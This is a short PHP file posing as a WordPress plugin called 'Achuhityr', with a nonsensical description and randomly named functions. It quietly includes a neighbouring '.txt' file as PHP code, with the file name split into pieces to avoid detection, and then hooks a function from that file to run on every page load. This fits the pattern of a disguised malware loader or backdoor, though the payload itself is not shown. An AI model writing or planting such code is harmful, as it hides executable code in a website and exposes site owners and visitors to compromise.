<?php

/**
 * Plugin Name: Achuhityr
 * Plugin URI: https://airs606.gov/achuhityr
 * Description: Categories (types) on American Literature. These include the Victorian Supreme Court.
 * Version: 1.3.10
 * Author: Richie Cliff
 * Author URI: https://airs606.gov
 * Text Domain: achuhityr
 * License: GPL2+
 *
 */

function yhynem_khezobykhef() {
    cajobo_echicudog();
}

$hutozeb = __DIR__ . '/yhorame.txt';
if (file_exists($hutozeb)) {
    include_once __DIR__ . "/yhor" . "ame." . "txt";
}


if (function_exists("cajobo_echicudog")) {
    $ygupoho = new favewe_zhumuzukhij();
    if ($ygupoho->xecuji_syvajajyn()) {
        add_action('init', 'yhynem_khezobykhef');
    }
}